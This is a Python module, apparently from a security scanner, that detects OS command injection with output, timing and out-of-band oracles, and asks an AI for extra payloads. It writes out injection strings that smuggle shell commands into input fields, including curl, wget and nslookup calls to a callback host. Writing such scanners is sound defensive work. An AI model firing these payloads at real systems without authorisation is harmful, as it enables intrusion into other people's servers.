"""OS command injection detection.

Uses three oracles, in order of reliability:

1. **output**  — inject ``echo <marker>`` variants and look for the marker.
2. **time**    — inject ``sleep``/``ping`` and confirm a delay over baseline.
3. **oob**     — inject a DNS/HTTP callback to confirm blind execution.

All proofs are non-destructive: they echo a random token, sleep briefly, or
trigger an out-of-band lookup. No payload modifies or damages the target.
"""

from __future__ import annotations

from ..engine.models import Severity, Target
from .base import Module

_SEPARATORS = [";", "|", "||", "&", "&&", "\n", "%0a", "`", "$(", "){"]


class CommandInjection(Module):
    name = "cmd_injection"
    vuln_class = "OS Command Injection"
    severity = Severity.CRITICAL
    remediation = (
        "Never pass user input to a shell. Use parameterized process APIs "
        "(e.g. execve with an argument vector, subprocess with shell=False), "
        "strict allow-lists for any values that must reach a command, and drop "
        "shell metacharacters. Run services with least privilege."
    )

    def _output_payloads(self, marker: str) -> list[str]:
        cmd = f"echo {marker}"
        payloads = []
        for sep in _SEPARATORS:
            if sep == "`":
                payloads.append(f"`{cmd}`")
            elif sep == "$(":
                payloads.append(f"$({cmd})")
            elif sep == "){":
                continue
            else:
                payloads.append(f"{sep}{cmd}")
                payloads.append(f"x{sep}{cmd}")
        # Quote-breakout variants.
        payloads.append(f"'; {cmd};'")
        payloads.append(f'"; {cmd};"')
        payloads.append(f"'|{cmd}")
        return payloads

    def _time_payloads(self, seconds: int = 6) -> list[str]:
        cmds = [f"sleep {seconds}", f"ping -c {seconds} 127.0.0.1",
                f"ping -n {seconds} 127.0.0.1"]
        out = []
        for c in cmds:
            out.append(f"; {c}")
            out.append(f"| {c}")
            out.append(f"& {c}")
            out.append(f"`{c}`")
            out.append(f"$({c})")
        return out

    def _oob_payloads(self, host: str) -> list[str]:
        cmds = [f"nslookup {host}", f"curl http://{host}/", f"wget -qO- http://{host}/",
                f"ping -c 1 {host}"]
        out = []
        for c in cmds:
            out.append(f"; {c}")
            out.append(f"| {c}")
            out.append(f"`{c}`")
            out.append(f"$({c})")
        return out

    async def run(self, target: Target) -> None:
        for point in target.injection_points():
            marker = self.marker()

            # 1) Output-based (most reliable, non-blind).
            payloads = self._output_payloads(marker)
            ai_extra = await self.ai_expand(
                point, marker,
                context=f"OS command injection at {point.describe()} on "
                        f"{target.url}. Baseline value: {point.baseline_value!r}.",
            )
            hit = await self.try_payloads(point, payloads + ai_extra, marker,
                                          oracle="output")
            if hit:
                continue

            # 2) Time-based (blind, output suppressed).
            if await self._confirm_time(point):
                continue

            # 3) Out-of-band (blind, no output and no timing signal).
            await self._confirm_oob(point)

    async def _confirm_time(self, point) -> bool:
        seconds = 6
        for payload in self._time_payloads(seconds):
            result = await self.s.probe(
                point=point, payload=payload, marker="",
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                return False
            baseline = await self.s.baseline(point)
            if result.elapsed >= baseline + (seconds - 1.5):
                # Re-test once to reduce false positives from jitter.
                confirm = await self.s.probe(
                    point=point, payload=payload, marker="",
                    vuln_class=self.vuln_class, module=self.name,
                )
                if confirm and confirm.elapsed >= baseline + (seconds - 1.5):
                    result.verdict.verdict = "executed"
                    result.verdict.confidence = 0.85
                    result.verdict.signal = (
                        f"time-based: {confirm.elapsed:.1f}s vs baseline {baseline:.1f}s"
                    )
                    self._record(confirm, oracle="time",
                                 confidence=self._time_confidence())
                    return True
        return False

    async def _confirm_oob(self, point) -> bool:
        if not self.s.oob.active:
            return False
        token = self.s.oob.new_token("ci")
        host = self.s.oob.callback_host(token)
        for payload in self._oob_payloads(host):
            result = await self.s.probe(
                point=point, payload=payload, marker="",
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                break
            inter = await self.s.oob.wait_for(token, timeout=6.0)
            if inter is not None:
                result.verdict.verdict = "executed"
                result.verdict.confidence = 0.95
                result.verdict.signal = f"out-of-band {inter.protocol} callback received"
                result.verdict.evidence = inter.raw or inter.source_ip
                self._record(result, oracle="oob")
                return True
        return False

    @staticmethod
    def _time_confidence():
        from ..engine.models import Confidence

        return Confidence.FIRM
